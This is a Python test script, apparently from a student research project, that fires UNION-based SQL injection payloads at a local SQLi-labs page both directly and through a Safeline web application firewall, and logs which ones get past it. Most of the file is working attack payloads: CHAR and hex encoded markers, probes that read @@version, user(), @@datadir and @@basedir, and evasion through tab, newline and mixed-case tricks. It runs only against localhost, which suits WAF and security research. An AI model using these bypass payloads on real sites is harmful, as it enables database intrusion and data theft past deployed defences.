"""
bypass_lab/test_no_dbfunc.py
=============================
Hypothesis: 'database()' yang trigger Safeline, bukan CHAR/hex sendiri.

Test: ganti database() di col1 dengan nilai lain (1, @@version, user(), dll)
Kalau col2=CHAR(SEQSQLI_START) dan col3=CHAR(SEQSQLI_END) pass WAF,
kita punya bypass yang return markers → classify sebagai SUCCESS!

Run:
    python3 -m bypass_lab.test_no_dbfunc
"""
import sys, time
sys.path.insert(0, '/mnt/d/Kuliah/RL/SeqSQLi')
from seqsqli.core.response import classify_response
import requests

PLAIN = "http://localhost:8081/Less-1/"
WAF   = "http://localhost:8888/Less-1/"

CHAR_START = "CHAR(83,69,81,83,81,76,73,95,83,84,65,82,84)"
CHAR_END   = "CHAR(83,69,81,83,81,76,73,95,69,78,68)"
HEX_START  = "0x534551534c495f5354415254"
HEX_END    = "0x534551534c495f454e44"
FOUND = []


def t(label, payload):
    rp = requests.get(PLAIN, params={"id": payload}, timeout=8)
    rw = requests.get(WAF,   params={"id": payload}, timeout=8)

    plain_ok  = classify_response(rp.text, rp.status_code, "union",
                                  strict_markers=True) == "SUCCESS"
    plain_err = "syntax" in rp.text.lower() or "error" in rp.text.lower()
    waf_ok    = classify_response(rw.text, rw.status_code, "union",
                                  strict_markers=True) == "SUCCESS"
    waf_pass  = rw.status_code != 403

    p_tag = "OK" if plain_ok else ("ERR" if plain_err else "NODATA")
    w_tag = "*** BYPASS ***" if waf_ok else ("PASS" if waf_pass else "BLOCK")

    print(f"  plain={p_tag:<8} waf={w_tag:<16} | {label}")
    if waf_ok:
        FOUND.append(("BYPASS", label, payload))
        print(f"    {payload[:100]}")
    elif waf_pass and plain_ok:
        FOUND.append(("NEAR", label, payload))
        print(f"    *** NEAR MISS ***  {payload[:80]}")
    time.sleep(0.3)


print("=" * 65)
print(" Test: col1 tanpa database() — apakah CHAR/hex markers pass?")
print("=" * 65)

BASE = ".1-- -'/0 UNION ALL SELECT"

# ── 1. Col1=1 (angka biasa) + CHAR markers ───────────────────────────
print("\n[1] col1=1, markers=CHAR")
t("1,CHAR,CHAR + -- -",    f"{BASE} 1,{CHAR_START},{CHAR_END}-- -")
t("1,CHAR,CHAR + #",       f"{BASE} 1,{CHAR_START},{CHAR_END}#")
t("1,CHAR,CHAR + quote'",  f"{BASE} 1,{CHAR_START},{CHAR_END}'")

# ── 2. Col1=1 + hex markers ───────────────────────────────────────────
print("\n[2] col1=1, markers=hex")
t("1,hex,hex + -- -",      f"{BASE} 1,{HEX_START},{HEX_END}-- -")
t("1,hex,hex + #",         f"{BASE} 1,{HEX_START},{HEX_END}#")
t("1,hex,hex + quote'",    f"{BASE} 1,{HEX_START},{HEX_END}'")

# ── 3. Col1=NULL + markers ────────────────────────────────────────────
print("\n[3] col1=NULL")
t("NULL,CHAR,CHAR",        f"{BASE} NULL,{CHAR_START},{CHAR_END}-- -")
t("NULL,hex,hex",          f"{BASE} NULL,{HEX_START},{HEX_END}-- -")

# ── 4. Col1=system vars (bukan database()) ───────────────────────────
print("\n[4] col1=system vars")
for col1 in ["@@version", "@@hostname", "user()", "version()",
             "@@datadir", "@@basedir", "now()", "pi()"]:
    t(f"col1={col1},CHAR",
      f"{BASE} {col1},{CHAR_START},{CHAR_END}-- -")
    t(f"col1={col1},hex",
      f"{BASE} {col1},{HEX_START},{HEX_END}-- -")

# ── 5. Col1=database() tapi markers=angka (cari mana yang trigger) ───
print("\n[5] Isolasi: database() dengan markers berbeda")
t("database(),1,2",
  f"{BASE} database(),1,2-- -")
t("database(),CHAR,CHAR",
  f"{BASE} database(),{CHAR_START},{CHAR_END}-- -")
t("1,database(),1",
  f"{BASE} 1,database(),1-- -")
t("1,1,database()",
  f"{BASE} 1,1,database()-- -")

# ── 6. CHAR markers dengan whitespace/case tricks ─────────────────────
print("\n[6] 1,CHAR,CHAR + whitespace combos")
t("tab separator",
  f".1--\t-'/0\tUNION\tALL\tSELECT\t1,{CHAR_START},{CHAR_END}-- -")
t("newline separator",
  f".1--\n-'/0\nUNION\nALL\nSELECT\n1,{CHAR_START},{CHAR_END}-- -")
t("case UNION",
  f"{BASE.replace('UNION ALL SELECT','uNiOn aLl sElEcT')} 1,{CHAR_START},{CHAR_END}-- -")

# ── Summary ───────────────────────────────────────────────────────────
print("\n" + "=" * 65)
bypasses = [x for x in FOUND if x[0] == "BYPASS"]
nears    = [x for x in FOUND if x[0] == "NEAR"]
print(f" BYPASS: {len(bypasses)}  |  NEAR MISS: {len(nears)}")
for tag, label, p in FOUND:
    print(f"\n  [{tag}] {label}")
    print(f"  {p[:110]}")
